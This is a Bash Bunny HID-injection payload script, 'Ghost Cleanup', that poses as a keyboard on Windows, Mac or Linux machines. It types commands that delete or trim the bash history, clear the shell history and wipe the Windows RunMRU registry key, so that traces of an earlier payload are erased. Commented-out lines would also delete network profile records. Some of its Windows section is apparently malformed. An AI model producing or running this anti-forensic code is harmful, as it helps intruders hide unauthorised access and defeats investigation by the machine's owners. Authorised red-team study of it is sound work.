#!/bin/bash
#
# Title:         Ghost Cleanup
# Author:        bg-wa
# Version:       0.1
# Target:        Windows, Mac, Linux
# Props:         Hak5 E2124 - https://www.youtube.com/watch?v=qGPGOoJn54E
#
# Cleans the input history on Windows, Mac and Linux
#
LED R

#+++ CONFIG +++

# EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : 0 = ALL
LINES=0

#+++ END CONFIG +++

#if [ $DEBUG==true ]; then
#    DEBUG_FILE="/root/udisk/loot/ghost_cleanup/debug.txt"
#    if [ ! -d "/root/udisk/loot/ghost_cleanup" ]; then
#      mkdir /root/udisk/loot
#      mkdir /root/udisk/loot/ghost_cleanup
#    fi
#    touch "${DEBUG_FILE}"
#fi

# PLATFORM CHECK
# LOOTFILE CHECK - DEFAULT PLATFORM: MAC / LINUX.
# FOR WINDOWS, CREATE FILE '/root/udisk/loot/ghost_cleanup/win_switch' IN YOUR FIRST PAYLOAD.

if [ -f "/root/udisk/loot/ghost_cleanup/win_switch" ]; then
    LED B
    PLATFORM_COMMAND="powershell"
else
    LED R G
    PLATFORM_COMMAND="terminal"
fi

# START
# TODO: should be set to Mac Keyboard
ATTACKMODE HID

QUACK DELAY 500
QUACK ALT F2
QUACK DELAY 50
QUACK GUI SPACE
QUACK DELAY 50
QUACK GUI r
QUACK BACKSPACE
QUACK DELAY 100
QUACK STRING "${PLATFORM_COMMAND}"
QUACK DELAY 200
QUACK ENTER
QUACK DELAY 500

# PLATFORM COMMANDS
if [ "$PLATFORM_COMMAND"=="terminal" ]; then
# MAC / LINUX
    #++ INSERT CUSTOM MAC / LINUX CLEANUP GOODNESS ++


    if [ "$LINES" -gt "0" ]; then
        QUACK STRING head -n -$LINES "~/.bash_history"
        QUACK ENTER
        QUACK STRING history -c
        QUACK ENTER
    else
        QUACK STRING rm "~/.bash_history"
        QUACK ENTER
        QUACK STRING history -c
        QUACK ENTER
    fi
else
# WINDOWS
    @echo off
    #++ INSERT CUSTOM WINDOWS CLEANUP GOODNESS ++


    # REMOVE ALL ETHERNET ADAPTERS
    # QUACK STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
    # QUACK ENTER
    # QUACK DELAY 100

    # REMOVE EXTRA ETHERNET CONNECTIONS
    # QUACK STRING netsh show profiles
    # QUACK ENTER
    # QUACK DELAY 100
    # todo ADAPTER=Get last ethernet adapter
    # QUACK ENTER
    # QUACK STRING netsh delete profile interface= $ADAPTER
    # QUACK ENTER
    # QUACK DELAY 100

    if [ "$LINES" -gt "0" ]; then
        QUACK setlocal enableextensions enabledelayedexpansion
        QUACK ENTER
        QUACK set len="${LINES}"
        QUACK set /a len_pos=%len%-1
        QUACK ENTER

        QUACK for /f "tokens=2*" %%a in ('reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /v MRUList') do set "mru=%%b"
        QUACK ENTER
        QUACK for /f %%c in ('cmd /u /v /q /c"(echo(!mru!)" ^| find /v "" ^| findstr /r /c:"[a-z]" ^| find /c /v ""') do set "str_len=%%c"
        QUACK ENTER
        # Get the last Nr of defined lines from MRUList
        set list=!mru:~0,%len%!
        QUACK ENTER
        # Set the new MRUList
        QUACK set original_list=!mru:~%len%,%str_len%!
        QUACK ENTER

        # Delete old MRUList
        QUACK reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /f
        QUACK ENTER
        # Add new MRUList
        QUACK reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /t Reg_Sz /d %original_list%
        QUACK ENTER
        # Delete the last Nr of lines from Registry
        QUACK for /l %%d in (0,1,%len_pos%) do (reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v !list:~%%d,1! /f)
    else
        QUACK STRING reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
        QUACK ENTER
    fi

fi

QUACK DELAY 100
QUACK STRING exit
QUACK ENTER

LED G
